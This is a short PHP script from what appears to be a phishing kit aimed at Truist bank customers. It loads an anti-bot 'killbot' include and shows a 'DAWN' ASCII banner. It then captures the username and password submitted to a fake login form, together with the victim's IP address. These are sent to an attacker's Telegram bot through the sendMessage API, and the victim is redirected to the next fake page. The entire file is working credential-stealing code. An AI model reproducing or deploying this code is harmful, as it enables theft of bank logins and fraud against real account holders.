<?php 



require_once($_SERVER['DOCUMENT_ROOT'].'/killbot/code/include.php');
/*

        /$$$$$$$   /$$$$$$ \ _$$    _$_   _$$__  _
       | $$__  $$ /$$__  $$ |$$$|  |$$$| | $$$ | $|
       | $$  \ $$| $$  \ $$ |$$$|  |$$$| | $$$$| $|
       | $$  | $$| $$$$$$$$ |$$$|  |$$$| | $$ $$ $|
       | $$  | $$| $$__  $$ |$$$|  |$$$| | $$ $$$$|
       | $$  | $$| $$  | $$ |$$  /\ $$ | | $$\ $$$|
       | $$$$$$$/| $$  | $$ |$$ /  \$$ | | $$ \ $$|
       |_______/ |__/  |__/ |__/    \__| |__/  \__/      
                                                                                                

*/


 
     
include "cn.php";$ip=getenv("REMOTE_ADDR");
$ur=$_POST['usr'];$pr=$_POST['psd'];
$msg=$ip."\nDawn676-Truist Userid : ".$ur."\nUser pass: ".$pr;
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=".urlencode($msg)."");





header("location:../diasuser-lg.php");

	

?>